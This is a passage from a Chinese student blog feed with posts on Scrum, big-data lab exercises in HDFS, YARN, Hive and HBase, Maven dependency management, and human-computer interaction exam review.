<li><p><strong>关键流程与活动</strong><br>迭代（Sprint）是Scrum的核心实践单元，通常持续2-4周。每个迭代以计划会议开始，以回顾会议总结。书中指出，通过频繁的迭代交付，不仅能早期发现问题，也能及时验证产品方向是否符合用户需求。</p>
<ul>
<li>冲刺规划会：确定冲刺目标，分配任务并定义“完成”的标准。</li>
<li>每日站会：团队成员快速同步进展、讨论障碍，保持项目透明。</li>
<li>冲刺回顾会和回顾会：评估成果与过程，寻找可改进的空间，确保持续优化。</li>
</ul>
</li>
<li><p><strong>透明性、检查与适应</strong><br>书中反复强调了Scrum的三大支柱——透明性、检查与适应。通过清晰的可视化工具（如看板、燃尽图等）以及定期评估，团队能够动态调整工作方式和目标。</p>
</li>
<li><p><strong>实践中的挑战与解决之道</strong><br>书中详细列举了Scrum实践中的常见问题（如利益相关者干扰、团队成员角色冲突等），并提供了实用的解决建议。这些内容贴合实际项目场景，具有很强的指导意义。</p>
</li>
</ol>
<h3 id="四、批评与局限性"><a href="#四、批评与局限性" class="headerlink" title="四、批评与局限性"></a>四、批评与局限性</h3><p>尽管本书对于Scrum的介绍相对全面，但在阅读过程中，我也发现了一些局限性和问题：</p>
<ol>
<li><strong>过于理想化的流程描述</strong><br>书中所描绘的Scrum实践过程存在一些“教科书化”，忽略了复杂项目中可能存在的资源不足、团队文化差异等现实问题。例如，对于团队内冲突的处理，书中建议通过定期沟通和反馈解决，但未深入探讨如何在实际压力环境中化解根本性矛盾。再例如，书中对Scrum Master、产品负责人和团队成员的角色分配较为理想化，实际工作中这些角色的界限常常模糊，尤其在资源不足或多角色重叠的情况下。</li>
<li><strong>案例的局限性</strong><br>书中引用的大部分案例偏向于小型或中型团队项目，而对于复杂的跨国大型项目的管理缺乏讨论。这使得其内容对大规模敏捷实施的指导意义相对有限。</li>
<li><strong>缺少对工具和技术的深入讲解</strong><br>书中虽然提到了一些可用于Scrum的辅助工具（如燃尽图、任务管理软件等），但并未详细说明如何结合这些工具优化Scrum实践。对于当代数字化工具丰富的环境而言，这无疑是一个可提升之处。</li>
<li><strong>忽视文化差异的影响</strong><br>Scrum作为一种西方主导的管理方法，在跨文化团队中的实施效果未被充分探讨。例如，书中未深入探讨团队成员面对权威文化或非扁平化组织结构时的适应问题。</li>
</ol>
<h3 id="五、自己的感悟和思考"><a href="#五、自己的感悟和思考" class="headerlink" title="五、自己的感悟和思考"></a>五、自己的感悟和思考</h3><p>阅读《Scrum要素》后，我对Scrum框架的内在逻辑和应用场景有了更深的认识。我认为Scrum的最大魅力在于其鼓励团队在高度不确定性环境中不断学习和快速迭代。这种思维与现代软件开发对快速交付与高效反馈的需求高度契合。</p>
<p>然而，在实际项目中，我也看到了一些需要警惕的问题。例如，Scrum对团队成员自主性与协作能力的要求较高，在国内某些企业中，习惯了传统管理模式的团队可能需要较长的适应期。此外，Scrum的实施并非“一招制胜”，它需要持续优化和改进，这对团队领导者的敏捷思维和长期投入提出了较高要求。</p>
<p>书中提到的“拥抱变化”的理念让我印象深刻。在现代技术环境中，需求变更是一种常态，传统瀑布式开发往往难以应对。我认为，Scrum不仅是一种项目管理框架，更是一种思想转变，它提醒我们在快速变化的世界中始终保持灵活性与适应能力。</p>
<h3 id="六、总结与评价"><a href="#六、总结与评价" class="headerlink" title="六、总结与评价"></a>六、总结与评价</h3><p>《Scrum要素》是一本兼具理论深度与实用性的优秀书籍。它系统阐述了Scrum的基本原理和应用方式，为读者提供了明确的指导方向。然而，书中对实际挑战的分析略显不足，对理论与实践结合的探讨仍有提升空间。</p>
<p>作为一名正在学习软件工程管理的学生，我从这本书中获得了许多关于敏捷开发和团队管理的启发。无论是理论性思考还是实践性操作，《Scrum要素》都能帮助读者进一步理解如何通过敏捷方法提升团队效率和应变能力。我希望今后能将这些知识更好地运用到团队协作和项目实践中。</p>
]]></content>
      <categories>
        <category>软件工程管理</category>
      </categories>
      <tags>
        <tag>软件工程管理</tag>
      </tags>
  </entry>
  <entry>
    <title>《大数据理论与实践Ⅰ》实验报告①</title>
    <url>/2024/12/14/%E3%80%8A%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AE%9E%E8%B7%B5%E2%85%A0%E3%80%8B%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%E2%91%A0/</url>
    <content><![CDATA[<h1 id="《大数据理论与实践Ⅰ》实验报告①"><a href="#《大数据理论与实践Ⅰ》实验报告①" class="headerlink" title="《大数据理论与实践Ⅰ》实验报告①"></a>《大数据理论与实践Ⅰ》实验报告①</h1><hr>
<h2 id="实验编号-1"><a href="#实验编号-1" class="headerlink" title="实验编号 1"></a>实验编号 1</h2><p><strong>实验名称</strong>： HDFS基本操作</p>
<p><strong>实验内容</strong>： </p>
<p><strong>第1步</strong>：启动 TDH Client，执行 TDH Client 的 <code>init.sh</code> 脚本，启动 TDH Client。 </p>
<span id="more"></span>

<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241214144429179.png" alt="image-20241214144429179"><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241214144442474.png" alt="image-20241214144442474"></p>
<p><strong>第2-6步</strong>：创建 <code>hdfs_data</code> 目录，将目录权限设为 777，然后创建一个 <code>file1</code> 文件，并上传到 <code>hdfs_data</code> 目录。最终查看目录和文件内容，结果如下： </p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241214144452547.png" alt="image-20241214144452547"></p>
<p><strong>第7步</strong>：访问网址 <a href="http://172.18.48.6:50070/">http://172.18.48.6:50070/</a>，找到 <code>/tmp/jinqiqing/hdfs_data</code> 目录，查看 <code>block ID</code> 为 <code>1112628409</code>。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241214144638576.png" alt="image-20241214144638576"> </p>
<hr>
<h2 id="实验编号-2"><a href="#实验编号-2" class="headerlink" title="实验编号 2"></a>实验编号 2</h2><p><strong>实验名称</strong>： YARN作业管理</p>
<p><strong>实验内容</strong>： </p>
<p><strong>第1步</strong>：启动 TDH Client，执行 TDH Client 的 <code>init.sh</code> 脚本，启动 TDH Client。 </p>
<p><strong>第2步</strong>：在本地创建一个 <code>wordcount.txt</code> 文件，上传至 HDFS 作业输入目录中。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241214144730780.png" alt="image-20241214144711681"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241214144744105.png" alt="image-20241214144744105"></p>
<p><strong>第3步</strong>：将 Hadoop MapReduce 程序 <code>hadoop-mapreduce-examples-2.7.2-transwarp-5.1.2.jar</code> 的 WordCount 作业提交给 YARN，并执行得出结果。<br><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241214144737712.png" alt="image-20241214144737712"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241214144758378.png" alt="image-20241214144758378"></p>
<p><strong>第4步</strong>：查看输出目录和输出结果，得到词频统计结果。<br><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241214144804441.png" alt="image-20241214144804441"></p>
<hr>
]]></content>
      <categories>
        <category>大数据理论与实践</category>
      </categories>
      <tags>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title>Maven依赖机制详解</title>
    <url>/2024/12/14/maven%E4%BE%9D%E8%B5%96%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h3 id="概要："><a href="#概要：" class="headerlink" title="概要："></a>概要：</h3><p>Maven 是 Java 项目中常用的构建工具，提供了强大的依赖管理机制。Maven 的依赖管理涵盖依赖传递、依赖范围、依赖排除等多个方面，帮助开发者轻松地管理项目中的第三方库和模块化代码。本文详细介绍了 Maven 的依赖机制及其使用场景，借助简单示例演示了 Maven 如何自动解析和解决复杂的依赖问题。</p>
<h3 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h3><hr>
<p>Maven 是 Java 项目最常用的构建工具之一，其强大的依赖管理功能使得开发者无需手动管理各种库和框架的版本、路径以及相互依赖关系。通过 <code>pom.xml</code> 文件，Maven 可以自动处理项目的所有依赖关系。本文将详细介绍 Maven 的依赖机制，包括依赖传递、依赖范围、依赖排除等核心概念，并配以简单的示例进行说明。</p>
<h3 id="2-Maven-依赖管理机制概述"><a href="#2-Maven-依赖管理机制概述" class="headerlink" title="2 Maven 依赖管理机制概述"></a>2 Maven 依赖管理机制概述</h3><hr>
<p>在 Maven 项目中，依赖关系通过 <code>pom.xml</code> 文件定义，依赖项可以从远程仓库自动下载，并放入本地仓库进行缓存。一个项目可以包含直接依赖和间接依赖（即传递依赖）。Maven 会递归解析项目所依赖的库，确保所有必需的库都被正确导入。</p>
<p>依赖管理的核心包括以下几个概念：</p>
<ul>
<li><strong>依赖传递性</strong></li>
<li><strong>依赖范围</strong></li>
<li><strong>依赖排除</strong></li>
<li><strong>版本冲突解决</strong></li>
</ul>
<span id="more"></span>

<h3 id="3-依赖传递性"><a href="#3-依赖传递性" class="headerlink" title="3 依赖传递性"></a>3 依赖传递性</h3><hr>
<p>Maven 允许项目中的依赖传递，也就是一个项目可以自动引入其依赖的依赖。假设项目 A 依赖 B，B 又依赖 C，那么 A 会自动引入 B 和 C。这种机制使得开发者不需要手动声明所有的库，减少了配置的冗余。</p>
<p>假设项目 A 依赖于库 B，即</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>B<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>此外 B 又依赖于库 C，即：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>C<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在此例中，项目 A 只需声明对 B 的依赖，而 B 的依赖（库 C）将自动被添加到项目中。</p>
<h3 id="4-可选依赖"><a href="#4-可选依赖" class="headerlink" title="4 可选依赖"></a>4 可选依赖</h3><hr>
<p>Maven 支持可选依赖（optional）机制，允许开发者声明某些依赖是可选的，不强制引入下游模块。</p>
<p>示例：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>D<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在这种情况下，下游依赖 D 的项目不会自动引入库 D，除非显式声明。</p>
<h3 id="5-依赖范围"><a href="#5-依赖范围" class="headerlink" title="5 依赖范围"></a>5 依赖范围</h3><hr>
<h4 id="5-1-常见依赖范围"><a href="#5-1-常见依赖范围" class="headerlink" title="5.1 常见依赖范围"></a>5.1 常见依赖范围</h4><p>Maven 提供了多种依赖范围，用来控制依赖在项目生命周期中的作用范围，常见的范围包括：</p>
<ul>
<li><strong>compile</strong>：默认范围，依赖在编译、测试和运行时都可用。</li>
<li><strong>provided</strong>：依赖在编译和测试时可用，但在运行时不可用，通常用于依赖已经由容器或服务器提供的库（如 Servlet API）。</li>
<li><strong>runtime</strong>：依赖在运行和测试时可用，但编译时不可用，常用于动态加载的库。</li>
<li><strong>test</strong>：仅在测试时可用，主要用于单元测试框架等。</li>
<li><strong>system</strong>：类似于 provided，但需要通过&lt;systemPath&gt;元素手动提供本地路径。</li>
<li><strong>import</strong>：用于引入依赖管理文件，通常用于聚合项目。</li>
</ul>
<p>示例：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>library<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>该依赖在编译时有效，但在运行时需要由外部环境（如应用服务器）提供。</p>
<h4 id="5-2-依赖范围对依赖传递的影响"><a href="#5-2-依赖范围对依赖传递的影响" class="headerlink" title="5.2 依赖范围对依赖传递的影响"></a>5.2 依赖范围对依赖传递的影响</h4><p>依赖范围不仅决定依赖在构建过程中的使用时机，还影响依赖的传递性。不同范围的依赖传递规则如下表所示。</p>
<p>其中最左列为第一直接依赖(B 在 A 中的依赖范围)，最上行为第二直接依赖(C 在 B 中的依赖范围)，中间单元格为传递性依赖范围(C 在 A 中的依赖范围)。</p>
<table>
<thead>
<tr>
<th></th>
<th><strong>compile</strong></th>
<th><strong>provided</strong></th>
<th><strong>runtime</strong></th>
<th><strong>test</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>compile</strong></td>
<td>compile(*)</td>
<td>-</td>
<td>runtime</td>
<td>-</td>
</tr>
<tr>
<td><strong>provided</strong></td>
<td>provided</td>
<td>-</td>
<td>provided</td>
<td>-</td>
</tr>
<tr>
<td><strong>runtime</strong></td>
<td>runtime</td>
<td>-</td>
<td>runtime</td>
<td>-</td>
</tr>
<tr>
<td><strong>test</strong></td>
<td>test</td>
<td>-</td>
<td>test</td>
<td>-</td>
</tr>
</tbody></table>
<p>例如，假如项目 A 依赖库 B ，依赖方式为compile，项目 B 依赖库 C，依赖方式为provided，那么最终项目 A 不会依赖库 C。</p>
<h3 id="6-依赖排除"><a href="#6-依赖排除" class="headerlink" title="6 依赖排除"></a>6 依赖排除</h3><hr>
<p>在某些情况下，项目的依赖可能会引入一些不必要的库，或者版本冲突。Maven 提供了依赖排除机制，可以显式排除某些传递依赖。</p>
<p>示例：</p>
<p>假设项目 A 依赖库 B，库 B 又依赖库 C。但项目 A 不需要库 C，可以通过以下配置排除 C：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>B<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>C<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过 <code>exclusions</code> 标签，Maven 会在解析依赖时跳过库 C 的引入。</p>
<h3 id="7-版本冲突与解决"><a href="#7-版本冲突与解决" class="headerlink" title="7 版本冲突与解决"></a>7 版本冲突与解决</h3><hr>
<p>在依赖传递过程中，多个依赖项可能会依赖于相同的库，但版本不同，这时就会产生版本冲突。Maven 提供了两种原则来解决依赖版本冲突问题：</p>
<ol>
<li>路径最近者优先原则</li>
<li>最先声明者优先原则</li>
</ol>
<h4 id="7-1-路径最近者优先"><a href="#7-1-路径最近者优先" class="headerlink" title="7.1 路径最近者优先"></a>7.1 路径最近者优先</h4><p>Maven 使用“路径最近者优先”（nearest wins）的原则来解决版本冲突。所谓路径，是指项目直接或间接依赖的深度。Maven 会从项目的直接依赖开始，依次向下遍历依赖树，选择距离项目根节点路径最短的依赖版本。</p>
<p>例如：</p>
<ul>
<li>项目 A 依赖库 B 和库 D</li>
<li>库 B 依赖库 C 的 1.0 版本</li>
<li>库 D 依赖库 E，库 E 依赖库 C 的 2.0 版本</li>
</ul>
<p>此时，项目 A 的依赖树如下：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">A <span class="punctuation">-&gt;</span> B <span class="punctuation">-&gt;</span> <span class="title function_ invoke__">C</span> (<span class="number">1.0</span>)</span><br><span class="line">A <span class="punctuation">-&gt;</span> D <span class="punctuation">-&gt;</span> E <span class="punctuation">-&gt;</span> <span class="title function_ invoke__">C</span> (<span class="number">2.0</span>)</span><br></pre></td></tr></table></figure>

<p>由于 <code>A -&gt; B -&gt; C (1.0)</code> 的路径比 <code>A -&gt; D -&gt; E -&gt; C (2.0)</code> 短，Maven 将选择 C 的 1.0 版本。</p>
<h4 id="7-2-最先声明者优先"><a href="#7-2-最先声明者优先" class="headerlink" title="7.2 最先声明者优先"></a>7.2 最先声明者优先</h4><p>如果两个依赖位于相同的路径深度上，即它们的距离相同，那么 Maven 会遵循“最先声明者优先”（first declared wins）的原则。Maven 将选择在 <code>pom.xml</code> 文件中首先声明的依赖项版本。</p>
<p>例如：</p>
<ul>
<li>项目 A 依赖库 B 和库 D</li>
<li>库 B 依赖库 C 的 1.0 版本</li>
<li>库 D 依赖库 C 的 2.0 版本</li>
<li><code>pom.xml</code> 中，B 的依赖声明在 D 之前</li>
</ul>
<p>此时，项目 A 的依赖树如下：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">A <span class="punctuation">-&gt;</span> B <span class="punctuation">-&gt;</span> <span class="title function_ invoke__">C</span> (<span class="number">1.0</span>)</span><br><span class="line">A <span class="punctuation">-&gt;</span> D <span class="punctuation">-&gt;</span> <span class="title function_ invoke__">C</span> (<span class="number">2.0</span>)</span><br></pre></td></tr></table></figure>

<p>由于 B 和 D 的依赖路径长度相同，Maven 将选择首先声明的库 B 的依赖，即 C 的 1.0 版本。</p>
<h3 id="8-总结"><a href="#8-总结" class="headerlink" title="8. 总结"></a>8. 总结</h3><hr>
<p>Maven 的依赖管理机制帮助开发者高效地管理项目中的外部库。通过依赖传递、依赖范围、依赖排除等功能，开发者可以自动解决依赖冲突、避免重复引入无关库，并且灵活控制依赖的作用范围。理解并掌握这些机制是构建稳定、高效的 Java 项目的关键。</p>
]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>Maven</tag>
        <tag>依赖管理</tag>
      </tags>
  </entry>
  <entry>
    <title>《大数据理论与实践Ⅰ》实验报告②</title>
    <url>/2024/12/14/%E3%80%8A%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AE%9E%E8%B7%B5%E2%85%A0%E3%80%8B%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%E2%91%A1/</url>
    <content><![CDATA[<h1 id="《大数据理论与实践Ⅰ》实验报告①"><a href="#《大数据理论与实践Ⅰ》实验报告①" class="headerlink" title="《大数据理论与实践Ⅰ》实验报告①"></a>《大数据理论与实践Ⅰ》实验报告①</h1><hr>
<h2 id="实验编号-3"><a href="#实验编号-3" class="headerlink" title="实验编号 3"></a>实验编号 3</h2><p><strong>实验名称</strong>： Hive基础使用</p>
<p><strong>实验内容</strong>： </p>
<p><strong>第1步</strong>：启动TDH Client 。</p>
<p><strong>第2步</strong>：连接Hive（Inceptor）。</p>
<span id="more"></span>

<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241214145032076.png" alt="image-20241214145032076"></p>
<p><strong>第3步</strong>：创建数据库，数据库名为db_jinqiqing。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241214145220327.png" alt="image-20241214145220327"></p>
<p><strong>第4步</strong>：创建外部表与内部表，并导入数据。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241214145212336.png" alt="image-20241214145212336"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241214145216028.png" alt="image-20241214145216028"></p>
<p><strong>第5步</strong>：创建wordcount.txt文件上传至HDFS，然后通过LOAD DATA方式导入至表中。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241214145159299.png" alt="image-20241214145159299"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241214145202944.png" alt="image-20241214145202944"></p>
<p><strong>第6步</strong>：用SQL完成词频统计分析，显示结果。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241214145153698.png" alt="image-20241214145153698"></p>
<hr>
<h2 id="实验编号-4"><a href="#实验编号-4" class="headerlink" title="实验编号 4"></a>实验编号 4</h2><p><strong>实验名称</strong>：HBase基础使用  </p>
<p><strong>实验内容</strong>： </p>
<p><strong>第1步</strong>：启动 TDH Client。 </p>
<p><strong>第2步</strong>：进入HBase命令行。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241214145324046.png" alt="image-20241214145324046"></p>
<p><strong>第3步</strong>：创建命名空间namespace_jinqiqing，创建表table_jinqiqing，并用put命令插入数据。<br><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241214145337619.png" alt="image-20241214145337619"></p>
<p><strong>第4步</strong>：使用get、scan命令读取数据，使用count命令统计行数。<br><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241214145354259.png" alt="image-20241214145354259"></p>
<p><strong>第5步</strong>：修改表属性。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241214145410279.png" alt="image-20241214145410279"></p>
<p><strong>第6步</strong>：分裂表。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241214145416983.png" alt="image-20241214145416983"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241214145422438.png" alt="image-20241214145422438"></p>
<p><strong>第7步</strong>：将表属性导出到本地Json文件，并查看表属性。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241214145431013.png" alt="image-20241214145431013"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241214145438771.png" alt="image-20241214145438771"></p>
<p><strong>第8步</strong>：查看META表，内容太多，选取与namespace_jinqiqing有关的。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241214145537470.png" alt="image-20241214145537470"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241214145547690.png" alt="image-20241214145547690"></p>
<p><strong>第9步</strong>：将表下线，然后删除表。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241214145603724.png" alt="image-20241214145603724"></p>
]]></content>
      <categories>
        <category>大数据理论与实践</category>
      </categories>
      <tags>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title>人机交互2023 期末复习</title>
    <url>/2024/12/15/%E4%BA%BA%E6%9C%BA%E4%BA%A4%E4%BA%92-%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<h4 id="人机交互发展历史"><a href="#人机交互发展历史" class="headerlink" title="人机交互发展历史"></a>人机交互发展历史</h4><ol>
<li><p>批处理阶段；</p>
</li>
<li><p>联机终端时代；</p>
</li>
<li><p>图形用户界面 GUI 时期：相较于命令行的优点是依赖识别而非记忆。</p>
</li>
<li><p>新的界面变革包含了上一代界面：作为一种特例</p>
</li>
<li><p>旧的交互方式仍有其存在的必要性：以前的用户从未消失</p>
</li>
</ol>
<h4 id="执行隔阂与评估隔阂"><a href="#执行隔阂与评估隔阂" class="headerlink" title="执行隔阂与评估隔阂"></a>执行隔阂与评估隔阂</h4><ol>
<li><p>执行隔阂：用户想要执行的动作和系统允许的动作有差异，比如想要提交找不到提交按钮；</p>
</li>
<li><p>评估隔阂：（评估阶段中）用户执行一个操作后总是想感知一下自己的操作的情况（是否结束、是否需要修改），但是系统没有给反馈。</p>
</li>
</ol>
<span id="more"></span>

<h4 id="界面类型"><a href="#界面类型" class="headerlink" title="界面类型"></a>界面类型</h4><ol>
<li><p>基于命令的界面；</p>
</li>
<li><p>WIMP（Window, Icon, Menu, Pointing） 和 GUI（Graphical User Interface）：</p>
</li>
<li><p>多媒体界面；</p>
</li>
<li><p>虚拟现实和增强现实；</p>
</li>
<li><p>信息可视化和仪表盘；</p>
</li>
<li><p>笔式交互和触摸交互；</p>
</li>
<li><p>手势界面；</p>
</li>
<li><p>实物界面 Tangible Interface；</p>
</li>
<li><p>可穿戴计算：舒适、卫生、续航、交互方式的选择……；</p>
</li>
<li><p>脑机界面；</p>
</li>
<li><p>GUI 的演化：更少的记忆、更多的识别、更少的键盘和点击、更不易出错、以及更可视的上下文</p>
</li>
</ol>
<h4 id="人类处理机模型"><a href="#人类处理机模型" class="headerlink" title="人类处理机模型"></a>人类处理机模型</h4><p>包含三个交互式组件：</p>
<ol>
<li>感知处理器：信息将被输出到声音存储和视觉存储区域</li>
<li>认知处理器：输入将被输出到工作记忆</li>
<li>动作处理器：执行动作</li>
</ol>
<h4 id="格式塔心理学"><a href="#格式塔心理学" class="headerlink" title="格式塔心理学"></a>格式塔心理学</h4><ol>
<li><strong>相近性原则</strong>：空间上比较靠近的物体容易被视为整体；设计界面时，应按照相关性对组件进行分组。</li>
<li><strong>相似性原则</strong>：人们习惯将看上去相似的物体看成一个整体。功能相近的组件应该使用相同或相近的表现形式。</li>
<li><strong>连续性原则</strong>：共线或具有相同方向的物体会被组合在一起。将组件对齐，更有助于增强用户的主观感知效果。</li>
<li><strong>完整性和闭合性原则</strong>：人们倾向于忽视轮廓的间隙而将其视作一个完整的整体：页面上的空白可帮助实现分组。</li>
</ol>
<h4 id="记忆特性"><a href="#记忆特性" class="headerlink" title="记忆特性"></a>记忆特性</h4><ol>
<li><strong>感觉记忆（瞬时记忆）</strong>：在人脑中持续约为 1 秒钟；帮助我们把相继出现的一组图片组合成一个连续的图像序列，产生动态的影像信息。</li>
<li><strong>短时记忆（工作记忆）</strong>：感觉记忆经编码后形成，约保持 30 秒；储存的是当前正在使用的信息，是信息加工系统的核心，可理解为计算机的内存；短时记忆的存储能力约为 7±2 个信息单元。</li>
<li><strong>长时记忆</strong>：短时记忆中的信息经进一步加工后会变为长时记忆；长时记忆的信息容量几乎是无限的。</li>
</ol>
<h4 id="用户测试：DECIDE评估框架"><a href="#用户测试：DECIDE评估框架" class="headerlink" title="用户测试：DECIDE评估框架"></a>用户测试：DECIDE评估框架</h4><ol>
<li>Determine：确定评估需要完成的总体目标</li>
<li>Explorer：发掘需要回答的具体问题</li>
<li>Choose：选择评估范型和技术</li>
<li>Identify：标识必须解决的实际问题</li>
<li>Decide：决定如何处理有关道德的问题</li>
<li>Evaluate：评估、解释并表示数据</li>
</ol>
<h4 id="可用性目标"><a href="#可用性目标" class="headerlink" title="可用性目标"></a>可用性目标</h4><ol>
<li>易学性</li>
<li>易记性</li>
<li>高效率</li>
<li>安全性</li>
<li>效用性</li>
<li>用户满意度</li>
</ol>
<h4 id="可用性工程：四个主要技术"><a href="#可用性工程：四个主要技术" class="headerlink" title="可用性工程：四个主要技术"></a>可用性工程：四个主要技术</h4><ol>
<li><p>用户和任务观察</p>
</li>
<li><p>场景（scenario）</p>
</li>
<li><p>边说边做（think aloud）：最有价值的单个可用性工程方法；让真实用户在使用系统执行一组特定任务的时候，讲出他们的所思所想。</p>
</li>
